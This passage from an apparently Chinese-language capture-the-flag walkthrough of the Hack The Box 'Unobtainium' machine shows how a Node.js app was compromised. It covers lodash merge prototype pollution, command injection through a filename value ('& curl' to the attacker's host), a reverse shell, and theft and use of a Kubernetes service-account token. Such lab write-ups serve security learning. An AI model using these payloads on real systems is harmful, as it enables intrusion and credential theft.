class="property">name</span> === auth.<span class="property">name</span> &amp;&amp;</span><br><span class="line">    u.<span class="property">password</span> === auth.<span class="property">password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(messages);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> message = &#123;</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;__&#x27;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  _.<span class="title function_">merge</span>(message, req.<span class="property">body</span>.<span class="property">message</span>, &#123;</span><br><span class="line">    <span class="attr">id</span>: lastId++,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">    <span class="attr">userName</span>: user.<span class="property">name</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  messages.<span class="title function_">push</span>(message);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">delete</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user || !user.<span class="property">canDelete</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  messages = messages.<span class="title function_">filter</span>(<span class="function">(<span class="params">m</span>) =&gt;</span> m.<span class="property">id</span> !== req.<span class="property">body</span>.<span class="property">messageId</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user || !user.<span class="property">canUpload</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  filename = req.<span class="property">body</span>.<span class="property">filename</span>;</span><br><span class="line">  root.<span class="title function_">upload</span>(<span class="string">&quot;./&quot;</span>,filename, <span class="literal">true</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="title class_">Uploaded</span><span class="attr">_File</span>: filename&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/todo&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">        <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filename = req.<span class="property">body</span>.<span class="property">filename</span>;</span><br><span class="line">        testFolder = <span class="string">&quot;/usr/src/app&quot;</span>;</span><br><span class="line">        fs.<span class="title function_">readdirSync</span>(testFolder).<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (file.<span class="title function_">indexOf</span>(filename) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> buffer = fs.<span class="title function_">readFileSync</span>(filename).<span class="title function_">toString</span>();</span><br><span class="line">                        res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">content</span>: buffer&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Listening on port 3000...&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>打这种东西上来就直接搜他的库，就像这里<code>google-cloudstorage-commands</code>,存在命令注入。</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/package/npm/google-cloudstorage-commands/0.0.1">https://security.snyk.io/package/npm/google-cloudstorage-commands/0.0.1</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PoC</span><br><span class="line">var root = require(<span class="string">&quot;google-cloudstorage-commands&quot;</span>);</span><br><span class="line">root.upload(<span class="string">&quot;./&quot;</span>,<span class="string">&quot;&amp; touch JHU&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user || !user.canUpload) &#123;</span><br><span class="line">    res.status(403).send(&#123;ok: <span class="literal">false</span>, error: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  filename = req.body.filename;</span><br><span class="line">  root.upload(\&quot;./\&quot;,filename, <span class="literal">true</span>);</span><br><span class="line">  res.send(&#123;ok: <span class="literal">true</span>, Uploaded_File: filename&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们获取到的index.js中也正存在这个漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user || !user.<span class="property">canUpload</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  filename = req.<span class="property">body</span>.<span class="property">filename</span>;</span><br><span class="line">  root.<span class="title function_">upload</span>(<span class="string">&quot;./&quot;</span>,filename, <span class="literal">true</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="title class_">Uploaded</span><span class="attr">_File</span>: filename&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是这里做了个校验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line">if (!user || !user.canUpload) &#123;</span><br></pre></td></tr></table></figure>

<p>一个是user要存在，一个是user需要有<code>user.canUpload</code>属性</p>
<p>看下user</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const users = [</span><br><span class="line">  &#123;name: &#x27;felamos&#x27;, password: &#x27;Winter2021&#x27;&#125;,</span><br><span class="line">  &#123;name: &#x27;admin&#x27;, password: Math.random().toString(32), canDelete: true, canUpload: true&#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><code>admin</code>有这个属性，但是密码我们获取不到</p>
<p>不过他这里有个<code>merge</code>，ctf的原型链中经常会用到的一个方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">app.put(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">  const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  if (!user) &#123;</span><br><span class="line">    res.status(403).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const message = &#123;</span><br><span class="line">    icon: &#x27;__&#x27;,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  _.merge(message, req.body.message, &#123;</span><br><span class="line">    id: lastId++,</span><br><span class="line">    timestamp: Date.now(),</span><br><span class="line">    userName: user.name,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  messages.push(message);</span><br><span class="line">  res.send(&#123;ok: true&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>考虑到可能是原型链污染，所以去查了下，这个方法是<code>lodash</code>库的，之前还真没细看他是哪个库的。</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732">https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/380873">https://hackerone.com/reports/380873</a></p>
<p>这里可以给<code>user</code>注入一个<code>canupload</code>属性</p>
<p>然后琢磨一下他发包的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_.merge(message, req.body.message, &#123;</span><br><span class="line">  id: lastId++,</span><br><span class="line">  timestamp: Date.now(),</span><br><span class="line">  userName: user.name,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>找一下app里的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var message = $(&quot;#message&quot;).val().trim();                                                 </span><br><span class="line">   $.ajax(&#123;                                                                                  </span><br><span class="line">   url: &#x27;http://unobtainium.htb:31337/&#x27;,                                                     </span><br><span class="line">   type: &#x27;put&#x27;,                                                                              </span><br><span class="line">   dataType:&#x27;json&#x27;,                                                                          </span><br><span class="line">   contentType:&#x27;application/json&#x27;,                                                           </span><br><span class="line">   processData: false,                                                                       </span><br><span class="line">   data: JSON.stringify(&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;message&quot;: &#123;&quot;text&quot;: message&#125;&#125;),</span><br><span class="line">   success: function(data) &#123;                                                                 </span><br><span class="line">       //$(&quot;#output&quot;).html(JSON.stringify(data));                                            </span><br><span class="line">       $(&quot;#output&quot;).html(&quot;Message has been sent!&quot;);                                          </span><br><span class="line">   &#125;   </span><br></pre></td></tr></table></figure>

<p>看样子直接把payload放到<code>message</code>，他就可以合并了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.235:31337</span><br><span class="line"></span><br><span class="line">User-Agent: curl/8.8.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 75</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;message&quot; :&#123;&quot;prototype&quot;: &#123;&quot;canUpload&quot;: true&#125;&#125;&#125;</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">X-Powered-By: Express</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">ETag: W/&quot;b-Ai2R8hgEarLmHKwesT1qcY913ys&quot;</span><br><span class="line"></span><br><span class="line">Date: Mon, 09 Dec 2024 06:29:30 GMT</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;ok&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>发起请求(这步有可能需要多发几次)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -XPOST &#x27;http://10.10.10.235:31337/upload&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;&amp; curl 10.10.16.8 &quot;&#125;&#x27; -sk</span><br><span class="line">&#123;&quot;ok&quot;:true,&quot;Uploaded_File&quot;:&quot;&amp; curl 10.10.16.8 &quot;&#125; </span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">10.10.10.235 - - [09/Dec/2024 01:59:17] &quot;GET / HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>revshell</p>
<p><img src="/wpimages/2024/tracks-cloud/Unobtianium/image-1.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-9546bc7cb-zjnnh:~# cat user.txt</span><br><span class="line">xx</span><br></pre></td></tr></table></figure>

<h2 id="to-Root"><a href="#to-Root" class="headerlink" title="to Root"></a>to Root</h2><p>直接找本地pod的和kubernets交互的token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># pwd</span><br><span class="line">/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line"># ls -alth</span><br><span class="line">total 4.0K</span><br><span class="line">drwxrwxrwt 3 root root  140 Dec  9 06:45 .</span><br><span class="line">drwxr-xr-x 2 root root  100 Dec  9 06:45 ..2024_12_09_06_45_02.919104325</span><br><span class="line">lrwxrwxrwx 1 root root   31 Dec  9 06:45 ..data -&gt; ..2024_12_09_06_45_02.919104325</span><br><span class="line">drwxr-xr-x 3 root root 4.0K Dec  8 15:21 ..</span><br><span class="line">lrwxrwxrwx 1 root root   13 Dec  8 15:21 ca.crt -&gt; ..data/ca.crt</span><br><span class="line">lrwxrwxrwx 1 root root   16 Dec  8 15:21 namespace -&gt; ..data/namespace</span><br><span class="line">lrwxrwxrwx 1 root root   12 Dec  8 15:21 token -&gt; ..data/token</span><br></pre></td></tr></table></figure>

<p>拿到看下当前对面的<code>namespaces</code>有哪些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -s --cacert ./ca.crt --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET https://10.10.10.235:8443/api/v1/namespaces -k -x http://127.0.0.1:8080|jq &#x27;.items.[].metadata.name&#x27;</span><br><span class="line">&quot;default&quot;</span><br><span class="line">&quot;kube-system&quot;</span><br><span class="line">&quot;kube-public&quot;</span><br><span class="line">&quot;kube-node-lease&quot;</span><br><span class="line">&quot;dev&quot;</span><br></pre></td></tr></table></figure>


<p>然后再挨个看下权限，通过刚刚我们拿到revshell的容器内的<code>namespace</code>可以看到到它属于<code>default</code>，所以看下其他的</p>
<h3 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; \</span><br><span class="line">    --data-binary $&#x27;&#123;\&quot;kind\&quot;:\&quot;SelfSubjectRulesReview\&quot;,\&quot;apiVersion\&quot;:\&quot;authorization.k8s.io/v1\&quot;,\&quot;metadata\&quot;:&#123;\&quot;creationTimestamp\&quot;:null&#125;,\&quot;spec\&quot;:&#123;\&quot;namespace\&quot;:\&quot;dev\&quot;&#125;,\&quot;status\&quot;:&#123;\&quot;resourceRules\&quot;:null,\&quot;nonResourceRules\&quot;:null,\&quot;incomplete\&quot;:false&#125;&#125;\x0a&#x27; \</span><br><span class="line">    &quot;https://10.10.10.235:8443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot; -x http://127.0.0.1:8080</span><br><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line"></span><br><span class="line">HTTP/2 201</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;SelfSubjectRulesReview&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;authorization.k8s.io/v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;creationTimestamp&quot;: null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;spec&quot;: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &#123;</span><br><span class="line">    &quot;resourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;,</span><br><span class="line">          &quot;list&quot;</span><br><span class="line">        ], </span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;namespaces&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;create&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;authorization.k8s.io&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;selfsubjectaccessreviews&quot;,</span><br><span class="line">          &quot;selfsubjectrulesreviews&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;,</span><br><span class="line">          &quot;list&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;pods&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;nonResourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/api&quot;,</span><br><span class="line">          &quot;/api/*&quot;,</span><br><span class="line">          &quot;/apis&quot;,</span><br><span class="line">          &quot;/apis/*&quot;,</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/openapi&quot;,</span><br><span class="line">          &quot;/openapi/*&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/.well-known/openid-configuration&quot;,</span><br><span class="line">          &quot;/openid/v1/jwks&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;incomplete&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>重点看当前token对dev有pod的查看和列出权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token)&quot; -s -k https://10.10.10.235:8443/api/v1/pods</span><br></pre></td></tr></table></figure>

<p>我这里机器挂了，就没有补写回显内容了</p>
<p>能看到<code>dev</code>中有三个<code>pod</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -s -k https://10.10.10.235:8443/api/v1/namespaces/dev/pods|jq &#x27;.items.[].metadata.managedFields.[].fieldsV1&#x27;|grep ip   </span><br><span class="line">      &quot;k:&#123;\&quot;ip\&quot;:\&quot;10.42.0.64\&quot;&#125;&quot;: &#123;</span><br><span class="line">        &quot;f:ip&quot;: &#123;&#125;</span><br><span class="line">      &quot;k:&#123;\&quot;ip\&quot;:\&quot;10.42.0.70\&quot;&#125;&quot;: &#123;</span><br><span class="line">        &quot;f:ip&quot;: &#123;&#125;</span><br><span class="line">      &quot;k:&#123;\&quot;ip\&quot;:\&quot;10.42.0.68\&quot;&#125;&quot;: &#123;</span><br><span class="line">        &quot;f:ip&quot;: &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>和服务端口</p>
